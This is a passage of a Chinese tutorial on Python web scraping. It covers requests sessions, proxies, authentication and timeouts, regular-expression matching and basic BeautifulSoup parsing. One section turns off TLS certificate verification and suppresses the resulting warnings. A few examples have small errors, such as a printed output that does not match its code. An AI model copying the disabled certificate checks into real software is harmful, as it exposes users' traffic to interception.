库的基本使用</strong></h3><h4 id="1-获取响应信息"><a href="#1-获取响应信息" class="headerlink" title="(1)获取响应信息"></a><strong>(1)获取响应信息</strong></h4><pre><code class="hljs">import requestsres = requests.get(&quot;http://www.baidu.com&quot;)print(res.status_code)print(res.text)print(res.cookies)</code></pre><h4 id="2-各种请求方法"><a href="#2-各种请求方法" class="headerlink" title="(2)各种请求方法"></a><strong>(2)各种请求方法</strong></h4><pre><code class="hljs">import requestsrequests.get(&quot;http://httpbin.org/get&quot;)requests.post(&quot;http://httpbin.org/post&quot;)requests.put(&quot;http://httpbin.org/put&quot;)requests.head(&quot;http://httpbin.org/get&quot;)requests.delete(&quot;http://httpbin.org/delete&quot;)requests.options(&quot;http://httpbin.org/get&quot;)</code></pre><h4 id="3-带参数的-get-请求"><a href="#3-带参数的-get-请求" class="headerlink" title="(3)带参数的 get 请求"></a><strong>(3)带参数的 get 请求</strong></h4><pre><code class="hljs">import requestsparams = &#123;    &#39;id&#39;:1,    &#39;user&#39;:&#39;Tom&#39;,    &#39;pass&#39;:&#39;123456&#39;&#125;res = requests.get(&#39;http://httpbin.org/get&#39;,params = params )print(res.text)</code></pre><h4 id="4-解析-json"><a href="#4-解析-json" class="headerlink" title="(4)解析 json"></a><strong>(4)解析 json</strong></h4><pre><code class="hljs">import requestsres = requests.get(&quot;http://httpbin.org/get&quot;)print(res.json())</code></pre><h4 id="5-获取二进制数据"><a href="#5-获取二进制数据" class="headerlink" title="(5)获取二进制数据"></a><strong>(5)获取二进制数据</strong></h4><pre><code class="hljs">import requestsresponse = requests.get(&quot;https://github.com/favicon.ico&quot;)with open(&#39;favicon.ico&#39;, &#39;wb&#39;) as f:    f.write(response.content)    f.close()</code></pre><h4 id="6-添加-headers"><a href="#6-添加-headers" class="headerlink" title="(6)添加 headers"></a><strong>(6)添加 headers</strong></h4><pre><code class="hljs">import requestsheaders = &#123;    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36&#39;&#125;response = requests.get(&quot;https://www.zhihu.com/explore&quot;, headers=headers)print(response.text)</code></pre><h4 id="7-POST-请求"><a href="#7-POST-请求" class="headerlink" title="(7)POST 请求"></a><strong>(7)POST 请求</strong></h4><pre><code class="hljs">import requestsdata = &#123;    &#39;id&#39;:1,    &#39;user&#39;:&#39;Tom&#39;,    &#39;pass&#39;:&#39;123456&#39;,&#125;res = requests.post(&#39;http://httpbin.org/post&#39;,data=data)print(res.text)</code></pre><h4 id="8-response-属性"><a href="#8-response-属性" class="headerlink" title="(8) response 属性"></a><strong>(8) response 属性</strong></h4><pre><code class="hljs">import requestsdata = &#123;    &#39;id&#39;:1,    &#39;user&#39;:&#39;Tom&#39;,    &#39;pass&#39;:&#39;123456&#39;,&#125;res = requests.post(&#39;http://httpbin.org/post&#39;,data=data)print(res.text)print(res.status_code)print(res.headers)print(res.cookies)print(res.history)print(res.url)</code></pre><h4 id="9-响应状态码"><a href="#9-响应状态码" class="headerlink" title="(9)响应状态码"></a><strong>(9)响应状态码</strong></h4><p>每一个状态码都对应着一个名字，我们只要调用这个名字就可以进行判断了</p><pre><code class="hljs">100: (&#39;continue&#39;,),101: (&#39;switching_protocols&#39;,),102: (&#39;processing&#39;,),103: (&#39;checkpoint&#39;,),122: (&#39;uri_too_long&#39;, &#39;request_uri_too_long&#39;),200: (&#39;ok&#39;, &#39;okay&#39;, &#39;all_ok&#39;, &#39;all_okay&#39;, &#39;all_good&#39;, &#39;\\o/&#39;, &#39;✓&#39;),201: (&#39;created&#39;,),202: (&#39;accepted&#39;,),203: (&#39;non_authoritative_info&#39;, &#39;non_authoritative_information&#39;),204: (&#39;no_content&#39;,),205: (&#39;reset_content&#39;, &#39;reset&#39;),206: (&#39;partial_content&#39;, &#39;partial&#39;),207: (&#39;multi_status&#39;, &#39;multiple_status&#39;, &#39;multi_stati&#39;, &#39;multiple_stati&#39;),208: (&#39;already_reported&#39;,),226: (&#39;im_used&#39;,),# Redirection.300: (&#39;multiple_choices&#39;,),301: (&#39;moved_permanently&#39;, &#39;moved&#39;, &#39;\\o-&#39;),302: (&#39;found&#39;,),303: (&#39;see_other&#39;, &#39;other&#39;),304: (&#39;not_modified&#39;,),305: (&#39;use_proxy&#39;,),306: (&#39;switch_proxy&#39;,),307: (&#39;temporary_redirect&#39;, &#39;temporary_moved&#39;, &#39;temporary&#39;),308: (&#39;permanent_redirect&#39;,      &#39;resume_incomplete&#39;, &#39;resume&#39;,), # These 2 to be removed in 3.0# Client Error.400: (&#39;bad_request&#39;, &#39;bad&#39;),401: (&#39;unauthorized&#39;,),402: (&#39;payment_required&#39;, &#39;payment&#39;),403: (&#39;forbidden&#39;,),404: (&#39;not_found&#39;, &#39;-o-&#39;),405: (&#39;method_not_allowed&#39;, &#39;not_allowed&#39;),406: (&#39;not_acceptable&#39;,),407: (&#39;proxy_authentication_required&#39;, &#39;proxy_auth&#39;, &#39;proxy_authentication&#39;),408: (&#39;request_timeout&#39;, &#39;timeout&#39;),409: (&#39;conflict&#39;,),410: (&#39;gone&#39;,),411: (&#39;length_required&#39;,),412: (&#39;precondition_failed&#39;, &#39;precondition&#39;),413: (&#39;request_entity_too_large&#39;,),414: (&#39;request_uri_too_large&#39;,),415: (&#39;unsupported_media_type&#39;, &#39;unsupported_media&#39;, &#39;media_type&#39;),416: (&#39;requested_range_not_satisfiable&#39;, &#39;requested_range&#39;, &#39;range_not_satisfiable&#39;),417: (&#39;expectation_failed&#39;,),418: (&#39;im_a_teapot&#39;, &#39;teapot&#39;, &#39;i_am_a_teapot&#39;),421: (&#39;misdirected_request&#39;,),422: (&#39;unprocessable_entity&#39;, &#39;unprocessable&#39;),423: (&#39;locked&#39;,),424: (&#39;failed_dependency&#39;, &#39;dependency&#39;),425: (&#39;unordered_collection&#39;, &#39;unordered&#39;),426: (&#39;upgrade_required&#39;, &#39;upgrade&#39;),428: (&#39;precondition_required&#39;, &#39;precondition&#39;),429: (&#39;too_many_requests&#39;, &#39;too_many&#39;),431: (&#39;header_fields_too_large&#39;, &#39;fields_too_large&#39;),444: (&#39;no_response&#39;, &#39;none&#39;),449: (&#39;retry_with&#39;, &#39;retry&#39;),450: (&#39;blocked_by_windows_parental_controls&#39;, &#39;parental_controls&#39;),451: (&#39;unavailable_for_legal_reasons&#39;, &#39;legal_reasons&#39;),499: (&#39;client_closed_request&#39;,),# Server Error.500: (&#39;internal_server_error&#39;, &#39;server_error&#39;, &#39;/o\\&#39;, &#39;✗&#39;),501: (&#39;not_implemented&#39;,),502: (&#39;bad_gateway&#39;,),503: (&#39;service_unavailable&#39;, &#39;unavailable&#39;),504: (&#39;gateway_timeout&#39;,),505: (&#39;http_version_not_supported&#39;, &#39;http_version&#39;),506: (&#39;variant_also_negotiates&#39;,),507: (&#39;insufficient_storage&#39;,),509: (&#39;bandwidth_limit_exceeded&#39;, &#39;bandwidth&#39;),510: (&#39;not_extended&#39;,),511: (&#39;network_authentication_required&#39;, &#39;network_auth&#39;, &#39;network_authentication&#39;),</code></pre><p><strong>实例代码：</strong></p><pre><code class="hljs">import requestsresponse = requests.get(&#39;http://www.jianshu.com/hello.html&#39;)exit() if not response.status_code == requests.codes.not_found else print(&#39;404 Not Found&#39;)</code></pre><h3 id="3-requests-库的进阶使用"><a href="#3-requests-库的进阶使用" class="headerlink" title="3.requests 库的进阶使用"></a><strong>3.requests 库的进阶使用</strong></h3><h4 id="1-文件上传"><a href="#1-文件上传" class="headerlink" title="(1)文件上传"></a><strong>(1)文件上传</strong></h4><pre><code class="hljs">import requestsfiles = &#123;&#39;file&#39;:open(&#39;E:\\1.png&#39;,&#39;rb&#39;)&#125;res= requests.post(&#39;http://httpbin.org/post&#39;,files=files)print(res.text)</code></pre><h4 id="2-获取-cookies"><a href="#2-获取-cookies" class="headerlink" title="(2)获取 cookies"></a><strong>(2)获取 cookies</strong></h4><pre><code class="hljs">import requestsres = requests.get(&quot;http://www.baidu.com&quot;)for key,value in res.cookies.items():    print(key + &quot;=&quot; + value)</code></pre><h4 id="3-会话维持"><a href="#3-会话维持" class="headerlink" title="(3)会话维持"></a><strong>(3)会话维持</strong></h4><p>这个用法非常的重要，在我们的模拟登陆的过程中是必然会用到的方法，在 CTF 的写脚本的过程中也经常会用到，所以我们稍微详细解释一下</p><p>我们在使用 requests.get 的时候要明确一点就是，我们每使用一个 requests.get 就相当于重新打开了一个浏览器，因此上一个 requests.get 中设置的 cookie 在下面的第二次请求中是不能同步的，我们来看下面的例子</p><p><strong>实例代码:</strong></p><pre><code class="hljs">import requests#这里我们设置了 cookie requests.get(&#39;http://httpbin.org/cookies/set/number/123456789&#39;)#我们再次发起请求，查看是否能带着我们设置的 cookie res = requests.get(&#39;http://httpbin.org/cookies&#39;)print(res.text)</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">&#123;  &quot;cookies&quot;: &#123;&#125;&#125;</code></pre><p>我们发现，正如我们上面分析的，我们第一次访问设置的 cookie 并没有在第二次访问中生效，那么怎么办呢，我们有一个 session() 方法能帮助我们解决这个问题</p><p><strong>实例代码：</strong></p><pre><code class="hljs">import requestss = requests.Session()s.get(&#39;http://httpbin.org/cookies/set/number/123456789&#39;)res = s.get(&#39;http://httpbin.org/cookies&#39;)print(res.text)</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">&#123;  &quot;cookies&quot;: &#123;    &quot;number&quot;: &quot;123456789&quot;  &#125;&#125;</code></pre><h4 id="4-证书验证"><a href="#4-证书验证" class="headerlink" title="(4)证书验证"></a><strong>(4)证书验证</strong></h4><p>我们在访问 https 的网站的时候浏览器首先会对网站的证书进行校验，如果发现这个证书不是官方授权的话就会出现警告页面而不会继续访问该网站，对于爬虫来讲就会抛出异常，那如果我们想要让爬虫忽略证书的问题继续访问这个网站的话就要对其进行设置</p><h5 id="1-忽略证书验证"><a href="#1-忽略证书验证" class="headerlink" title="1.忽略证书验证"></a><strong>1.忽略证书验证</strong></h5><pre><code class="hljs">import requestsresponse = requests.get(&#39;https://www.heimidy.cc/&#39;,verify=False)print(response.status_code)</code></pre><p>但是此时是存在一个警告的，我们可以通过导入 urilib3 的包，并调用消除 warning 的方法来消除这个警告</p><pre><code class="hljs">import requestsfrom requests.packages import urllib3urllib3.disable_warnings()response = requests.get(&#39;https://www.heimidy.cc/&#39;,verify=False)print(response.status_code)</code></pre><h5 id="2-手动指定本地证书进行验证"><a href="#2-手动指定本地证书进行验证" class="headerlink" title="2.手动指定本地证书进行验证"></a><strong>2.手动指定本地证书进行验证</strong></h5><pre><code class="hljs">import requestsresponse = requests.get(&#39;https://www.12306.cn&#39;, cert=(&#39;/path/server.crt&#39;, &#39;/path/key&#39;))print(response.status_code)</code></pre><h4 id="5-代理设置"><a href="#5-代理设置" class="headerlink" title="(5)代理设置"></a><strong>(5)代理设置</strong></h4><p>除了常见到的 https 和 http 代理以&#x3D;以外，我们还可以使用 socks 代理，不过需要 pip 安装一个 requests[socks] 包</p><pre><code class="hljs">import requestsproxies = &#123;    &quot;http&quot;:&quot;http://127.0.0.1:1080&quot;,    &quot;https&quot;:&quot;https://127.0.0.1:1080&quot;&#125;res = requests.get(&quot;https://www.google.com&quot;,proxies=proxies)print(res.status_code)</code></pre><p>这里有一个疑问就是我是用 socks 代理访问 google 是失败的，会报错</p><p><strong>实例代码：</strong></p><pre><code class="hljs">import requestsproxies = &#123;    &quot;http&quot;:&quot;socks5://127.0.0.1:1080&quot;,    &quot;https&quot;:&quot;socks5://127.0.0.1:1080&quot;&#125;res = requests.get(&quot;https://www.google.com&quot;,proxies=proxies,verify=False)print(res.status_code)</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">SSLError: SOCKSHTTPSConnectionPool(host=&#39;www.google.com&#39;, port=443): Max retries exceeded with url: / (Caused by SSLError(SSLError(&quot;bad handshake: SysCallError(-1, &#39;Unexpected EOF&#39;)&quot;)))</code></pre><p>试了一些方法都没什么效果，有待以后考证</p><h4 id="6-超时设置"><a href="#6-超时设置" class="headerlink" title="(6)超时设置"></a><strong>(6)超时设置</strong></h4><pre><code class="hljs">import requestsfrom requests.exceptions import ReadTimeouttry:    response = requests.get(&quot;http://httpbin.org/get&quot;, timeout = 0.5)    print(response.status_code)except ReadTimeout:    print(&#39;Timeout&#39;)</code></pre><h4 id="7-Basic-认证"><a href="#7-Basic-认证" class="headerlink" title="(7)Basic 认证"></a><strong>(7)Basic 认证</strong></h4><p><strong>实例代码一：</strong></p><pre><code class="hljs">import requestsfrom requests.auth import HTTPBasicAuthr = requests.get(&#39;http://120.27.34.24:9001&#39;, auth=HTTPBasicAuth(&#39;user&#39;, &#39;123&#39;))print(r.status_code)</code></pre><p><strong>实例代码二：</strong></p><pre><code class="hljs">import requestsr = requests.get(&#39;http://120.27.34.24:9001&#39;, auth=(&#39;user&#39;, &#39;123&#39;))print(r.status_code)</code></pre><h4 id="8-异常处理"><a href="#8-异常处理" class="headerlink" title="(8)异常处理"></a><strong>(8)异常处理</strong></h4><pre><code class="hljs">import requestsfrom requests.exceptions import ReadTimeout, ConnectionError, RequestExceptiontry:    response = requests.get(&quot;http://httpbin.org/get&quot;, timeout = 0.5)    print(response.status_code)except ReadTimeout:    print(&#39;Timeout&#39;)except ConnectionError:    print(&#39;Connection error&#39;)except RequestException:    print(&#39;Error&#39;)</code></pre><h2 id="0X05-正则表达式"><a href="#0X05-正则表达式" class="headerlink" title="0X05 正则表达式"></a><strong>0X05 正则表达式</strong></h2><h3 id="1-什么是正则表达式"><a href="#1-什么是正则表达式" class="headerlink" title="1.什么是正则表达式"></a><strong>1.什么是正则表达式</strong></h3><p>正则表达式是对字符串进行操作的一种逻辑公式，用事先定义好的一些特定的字符，以及这些字符的组合，组成一个规则字符串，用这个规则字符串去表达对字符串的一种过滤的逻辑，在python 中使用过re 库来实现</p><h3 id="2-常见的匹配模式"><a href="#2-常见的匹配模式" class="headerlink" title="2.常见的匹配模式"></a><strong>2.常见的匹配模式</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%801.png" alt="此处输入图片的描述"></p><h3 id="3-re-match"><a href="#3-re-match" class="headerlink" title="3.re.match"></a><strong>3.re.match</strong></h3><pre><code class="hljs">re.match(pattern, string, flags=0)</code></pre><h4 id="1-常规匹配"><a href="#1-常规匹配" class="headerlink" title="(1)常规匹配"></a><strong>(1)常规匹配</strong></h4><p>span() 方法是返回匹配的范围，group() 是返回匹配的结果</p><p><strong>实例代码：</strong></p><pre><code class="hljs">import recontent = &#39;Hello 123 4567 World_This is a Regex Demo&#39;res = re.match(&#39;^\w&#123;5&#125;\s\d&#123;3&#125;\s\d&#123;4&#125;\s\w&#123;10&#125;.*Demo$&#39;,content)print(res.span())print(res.group())</code></pre><h4 id="2-泛匹配"><a href="#2-泛匹配" class="headerlink" title="(2)泛匹配"></a><strong>(2)泛匹配</strong></h4><pre><code class="hljs">import recontent = &#39;Hello 123 4567 World_This is a Regex Demo&#39;res = re.match(&#39;^Hello.*Demo$&#39;,content)print(res.span())print(res.group())</code></pre><h4 id="3-匹配具体内容"><a href="#3-匹配具体内容" class="headerlink" title="(3)匹配具体内容"></a><strong>(3)匹配具体内容</strong></h4><p>我们如果想匹配具体的内容，我们可以用小括号将其括起来</p><pre><code class="hljs">import recontent = &#39;Hello 1234567 World_This is a Regex Demo&#39;res = re.match(&#39;^Hello\s(\d+)\s.*Demo$&#39;,content)print(res.span(1))print(res.group(1))</code></pre><h4 id="4-贪婪与非贪婪模式"><a href="#4-贪婪与非贪婪模式" class="headerlink" title="(4)贪婪与非贪婪模式"></a><strong>(4)贪婪与非贪婪模式</strong></h4><p>所谓贪婪模式指的就是<code>.*</code> 会匹配尽可能多的字符，我们来看下面的例子</p><p><strong>实例代码：</strong></p><pre><code class="hljs">import recontent = &#39;Hello 1234567 World_This is a Regex Demo&#39;res = re.match(&#39;^He.*(\d+).*Demo$&#39;,content)print(res.span(1))print(res.group(1))</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">(12, 13)7</code></pre><p>我们的本意是想匹配 1234567 这个字符串，但是实际上我们只匹配到了 7 ，因为<code>.*</code>默认的贪婪模式将123456匹配掉了，那么为了解决这个问题，我们可以使用<code>？</code> 去消除非贪婪模式</p><p><strong>实例代码：</strong></p><pre><code class="hljs">import recontent = &#39;Hello 1234567 World_This is a Regex Demo&#39;res = re.match(&#39;^He.*?(\d+).*Demo$&#39;,content)print(res.span(1))print(res.group(1))</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">(6, 13)1234567</code></pre><h4 id="5-匹配模式"><a href="#5-匹配模式" class="headerlink" title="(5)匹配模式"></a><strong>(5)匹配模式</strong></h4><p>匹配模式是用来解决一些细节问题的，比如匹配中的是否区分大小写、是否能匹配换行符等</p><p><strong>实例代码：</strong></p><pre><code class="hljs">import recontent = &#39;&#39;&#39;Hello 1234567 World_This is a Regex Demo&#39;&#39;&#39;res = re.match(&#39;^He.*?(\d+).*Demo$&#39;,content,re.S)print(res.span(1))print(res.group(1))</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">(6, 13)1234567</code></pre><p>可以发现我们的 <code>.*</code> 本来是不能匹配换行符的，但是我们使用了 re.S 的模式以后就可以正常匹配了</p><h4 id="6-转义字符"><a href="#6-转义字符" class="headerlink" title="(6)转义字符"></a>(6)转义字符</h4><p>如果在待匹配字符串中出现了正则表达式中的特殊字符，我们要对其进行转义操作</p><pre><code class="hljs">import recontent = &#39;price is $5.00&#39;res = re.match(&#39;price is \$5\.00&#39;, content)print(res.group())</code></pre><h3 id="4-re-search"><a href="#4-re-search" class="headerlink" title="4.re.search"></a><strong>4.re.search</strong></h3><p>我们上面介绍的 re.match 有一个弊端就是它只能从开头开始匹配，也就是说如果我们的正则不匹配第一个字符那么是无法匹配中间的字符的，所以我们还有一个武器叫  re.search，它会扫描整个字符串并返回第一个成功的匹配。</p><p><strong>实例代码：</strong></p><pre><code class="hljs">import recontent = &#39;Extra stings Hello 1234567 World_This is a Regex Demo Extra stings&#39;res = re.search(&#39;Hello.*?(\d+).*?Demo&#39;, content)print(res.group(1))</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">1234567 </code></pre><p>因为这个特性能大大减少我们写正则的难度，因此，我们在能用 search 的情况下就不要用 match </p><h4 id="匹配练习："><a href="#匹配练习：" class="headerlink" title="匹配练习："></a><strong>匹配练习：</strong></h4><p><strong>实例代码：</strong></p><pre><code class="hljs">import rehtml = &#39;&#39;&#39;&lt;div id=&quot;songs-list&quot;&gt;    &lt;h2 class=&quot;title&quot;&gt;经典老歌&lt;/h2&gt;    &lt;p class=&quot;introduction&quot;&gt;        经典老歌列表    &lt;/p&gt;    &lt;ul id=&quot;list&quot; class=&quot;list-group&quot;&gt;        &lt;li data-view=&quot;2&quot;&gt;一路上有你&lt;/li&gt;        &lt;li data-view=&quot;7&quot;&gt;            &lt;a href=&quot;/2.mp3&quot; singer=&quot;任贤齐&quot;&gt;沧海一声笑&lt;/a&gt;        &lt;/li&gt;        &lt;li data-view=&quot;4&quot; class=&quot;active&quot;&gt;            &lt;a href=&quot;/3.mp3&quot; singer=&quot;齐秦&quot;&gt;往事随风&lt;/a&gt;        &lt;/li&gt;        &lt;li data-view=&quot;6&quot;&gt;&lt;a href=&quot;/4.mp3&quot; singer=&quot;beyond&quot;&gt;光辉岁月&lt;/a&gt;&lt;/li&gt;        &lt;li data-view=&quot;5&quot;&gt;&lt;a href=&quot;/5.mp3&quot; singer=&quot;陈慧琳&quot;&gt;记事本&lt;/a&gt;&lt;/li&gt;        &lt;li data-view=&quot;5&quot;&gt;            &lt;a href=&quot;/6.mp3&quot; singer=&quot;邓丽君&quot;&gt;&lt;i class=&quot;fa fa-user&quot;&gt;&lt;/i&gt;但愿人长久&lt;/a&gt;        &lt;/li&gt;    &lt;/ul&gt;&lt;/div&gt;&#39;&#39;&#39;res = re.search(&#39;&lt;li.*?/2\.mp3.*?singer=&quot;(.*?)&quot;&gt;(.*?)&lt;/a&gt;&#39;,html,re.S)print(res.group(1),res.group(2))</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">任贤齐 沧海一声笑</code></pre><h3 id="5-re-findall"><a href="#5-re-findall" class="headerlink" title="5.re.findall"></a><strong>5.re.findall</strong></h3><p>与之前两个不同的是 re.findall 搜会索字符串，并以列表形式返回全部能匹配的子串。</p><h4 id="匹配练习一："><a href="#匹配练习一：" class="headerlink" title="匹配练习一："></a><strong>匹配练习一：</strong></h4><p><strong>实例代码：</strong></p><pre><code class="hljs">import rehtml = &#39;&#39;&#39;&lt;div id=&quot;songs-list&quot;&gt;    &lt;h2 class=&quot;title&quot;&gt;经典老歌&lt;/h2&gt;    &lt;p class=&quot;introduction&quot;&gt;        经典老歌列表    &lt;/p&gt;    &lt;ul id=&quot;list&quot; class=&quot;list-group&quot;&gt;        &lt;li data-view=&quot;2&quot;&gt;一路上有你&lt;/li&gt;        &lt;li data-view=&quot;7&quot;&gt;            &lt;a href=&quot;/2.mp3&quot; singer=&quot;任贤齐&quot;&gt;沧海一声笑&lt;/a&gt;        &lt;/li&gt;        &lt;li data-view=&quot;4&quot; class=&quot;active&quot;&gt;            &lt;a href=&quot;/3.mp3&quot; singer=&quot;齐秦&quot;&gt;往事随风&lt;/a&gt;        &lt;/li&gt;        &lt;li data-view=&quot;6&quot;&gt;&lt;a href=&quot;/4.mp3&quot; singer=&quot;beyond&quot;&gt;光辉岁月&lt;/a&gt;&lt;/li&gt;        &lt;li data-view=&quot;5&quot;&gt;&lt;a href=&quot;/5.mp3&quot; singer=&quot;陈慧琳&quot;&gt;记事本&lt;/a&gt;&lt;/li&gt;        &lt;li data-view=&quot;5&quot;&gt;            &lt;a href=&quot;/6.mp3&quot; singer=&quot;邓丽君&quot;&gt;但愿人长久&lt;/a&gt;        &lt;/li&gt;    &lt;/ul&gt;&lt;/div&gt;&#39;&#39;&#39;res = re.findall(&#39;&lt;li.*?href=&quot;(.*?)&quot;.*?singer=&quot;(.*?)&quot;&gt;(.*?)&lt;/a&gt;&#39;,html,re.S)#print(res)for i in res:    print(i[0],i[1],i[2])</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">[(&#39;/2.mp3&#39;, &#39;任贤齐&#39;, &#39;沧海一声笑&#39;), (&#39;/3.mp3&#39;, &#39;齐秦&#39;, &#39;往事随风&#39;), (&#39;/4.mp3&#39;, &#39;beyond&#39;, &#39;光辉岁月&#39;), (&#39;/5.mp3&#39;, &#39;陈慧琳&#39;, &#39;记事本&#39;), (&#39;/6.mp3&#39;, &#39;邓丽君&#39;, &#39;但愿人长久&#39;)]/2.mp3 任贤齐 沧海一声笑/3.mp3 齐秦 往事随风/4.mp3 beyond 光辉岁月/5.mp3 陈慧琳 记事本/6.mp3 邓丽君 但愿人长久</code></pre><h4 id="匹配练习二："><a href="#匹配练习二：" class="headerlink" title="匹配练习二："></a><strong>匹配练习二：</strong></h4><p><strong>实例代码：</strong></p><pre><code class="hljs">import rehtml = &#39;&#39;&#39;&lt;div id=&quot;songs-list&quot;&gt;    &lt;h2 class=&quot;title&quot;&gt;经典老歌&lt;/h2&gt;    &lt;p class=&quot;introduction&quot;&gt;        经典老歌列表    &lt;/p&gt;    &lt;ul id=&quot;list&quot; class=&quot;list-group&quot;&gt;        &lt;li data-view=&quot;2&quot;&gt;一路上有你&lt;/li&gt;        &lt;li data-view=&quot;7&quot;&gt;            &lt;a href=&quot;/2.mp3&quot; singer=&quot;任贤齐&quot;&gt;沧海一声笑&lt;/a&gt;        &lt;/li&gt;        &lt;li data-view=&quot;4&quot; class=&quot;active&quot;&gt;            &lt;a href=&quot;/3.mp3&quot; singer=&quot;齐秦&quot;&gt;往事随风&lt;/a&gt;        &lt;/li&gt;        &lt;li data-view=&quot;6&quot;&gt;&lt;a href=&quot;/4.mp3&quot; singer=&quot;beyond&quot;&gt;光辉岁月&lt;/a&gt;&lt;/li&gt;        &lt;li data-view=&quot;5&quot;&gt;&lt;a href=&quot;/5.mp3&quot; singer=&quot;陈慧琳&quot;&gt;记事本&lt;/a&gt;&lt;/li&gt;        &lt;li data-view=&quot;5&quot;&gt;            &lt;a href=&quot;/6.mp3&quot; singer=&quot;邓丽君&quot;&gt;但愿人长久&lt;/a&gt;        &lt;/li&gt;    &lt;/ul&gt;&lt;/div&gt;&#39;&#39;&#39;res = re.findall(&#39;&lt;li.*?&gt;\s*?(&lt;a.*?&gt;)?(\w+)(&lt;/a&gt;)?\s*?&lt;/li&gt;&#39;,html,re.S)for i in res:    print(i[0],i[1],i[2])</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs"> 一路上有你 &lt;a href=&quot;/2.mp3&quot; singer=&quot;任贤齐&quot;&gt; 沧海一声笑 &lt;/a&gt;&lt;a href=&quot;/3.mp3&quot; singer=&quot;齐秦&quot;&gt; 往事随风 &lt;/a&gt;&lt;a href=&quot;/4.mp3&quot; singer=&quot;beyond&quot;&gt; 光辉岁月 &lt;/a&gt;&lt;a href=&quot;/5.mp3&quot; singer=&quot;陈慧琳&quot;&gt; 记事本 &lt;/a&gt;&lt;a href=&quot;/6.mp3&quot; singer=&quot;邓丽君&quot;&gt; 但愿人长久 &lt;/a&gt;</code></pre><h3 id="6-re-sub"><a href="#6-re-sub" class="headerlink" title="6.re.sub"></a><strong>6.re.sub</strong></h3><p>该方法的作用是替换字符串中每一个匹配的子串后返回替换后的字符串</p><p><strong>实例代码一：</strong></p><pre><code class="hljs">import recontent = &#39;Extra stings Hello 1234567 World_This is a Regex Demo Extra stings&#39;res = re.sub(&#39;\d+&#39;,&#39;K0rz3n&#39;,content)print(res)</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">Extra stings Hello K0rz3n World_This is a Regex Demo Extra stings</code></pre><p>有时候我们替换的时候需要保留原始字符串，这个时候我们就要使用正则表达式的后向引用技术</p><p><strong>实例代码二：</strong></p><pre><code class="hljs">import recontent = &#39;Extra stings Hello 1234567 World_This is a Regex Demo Extra stings&#39;content = re.sub(&#39;(\d+)&#39;, &#39;\\1 8910&#39;, content)print(content)</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">Extra stings Hello 1234567 890 World_This is a Regex Demo Extra stings</code></pre><h3 id="7-re-compile"><a href="#7-re-compile" class="headerlink" title="7.re.compile"></a><strong>7.re.compile</strong></h3><p>该方法可以将正则表达式转换成正则表达式对象，方便我们后期的复用</p><p><strong>实例代码：</strong></p><pre><code class="hljs">import recontent = &#39;&#39;&#39;Hello 1234567 World_Thisis a Regex Demo&#39;&#39;&#39;pattern = re.compile(&#39;Hello.*Demo&#39;, re.S)res = re.match(pattern, content)print(res.group(0))</code></pre><h3 id="8-实战练习爬取豆瓣读书"><a href="#8-实战练习爬取豆瓣读书" class="headerlink" title="8.实战练习爬取豆瓣读书"></a><strong>8.实战练习爬取豆瓣读书</strong></h3><pre><code class="hljs">import requestsimport recontent = requests.get(&#39;http://book.douban.com/&#39;).textpattern = re.compile(&#39;&lt;li.*?cover.*?href=&quot;(.*?)&quot;.*?title=&quot;(.*?)&quot;.*?more-meta.*?author&quot;&gt;(.*?)&lt;/span&gt;.*?year&quot;&gt;(.*?)&lt;/span&gt;.*?&lt;/li&gt;&#39;, re.S)results = re.findall(pattern, content)for result in results:    url, name, author, date = result    author = re.sub(&#39;\s&#39;, &#39;&#39;, author)    date = re.sub(&#39;\s&#39;, &#39;&#39;, date)    print(url, name, author, date)</code></pre><h2 id="0X06-BeautifulSoup"><a href="#0X06-BeautifulSoup" class="headerlink" title="0X06 BeautifulSoup"></a><strong>0X06 BeautifulSoup</strong></h2><h3 id="1-什么是-BeautifulSoup"><a href="#1-什么是-BeautifulSoup" class="headerlink" title="1.什么是 BeautifulSoup"></a><strong>1.什么是 BeautifulSoup</strong></h3><p>这是一个方便的网页解析库，不用编写正则就是实现网页信息的提取</p><h3 id="2-常见的配合使用的解析库"><a href="#2-常见的配合使用的解析库" class="headerlink" title="2.常见的配合使用的解析库"></a><strong>2.常见的配合使用的解析库</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%802.png" alt="此处输入图片的描述"></p><h3 id="3-基本使用"><a href="#3-基本使用" class="headerlink" title="3.基本使用"></a><strong>3.基本使用</strong></h3><p><strong>实例代码：</strong></p><pre><code class="hljs">html = &quot;&quot;&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse&#39;s story&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p class=&quot;title&quot; name=&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&#39;s story&lt;/b&gt;&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were&lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;,&lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and&lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;;and they lived at the bottom of a well.&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;&quot;&quot;&quot;from bs4 import BeautifulSoupsoup = BeautifulSoup(html,&#39;lxml&#39;)print(soup.prettify())print(soup.title.string)</code></pre><p><strong>运行结果：</strong></p><pre><code class="hljs">&lt;html&gt; &lt;head&gt;  &lt;title&gt;   The Dormouse&#39;s story  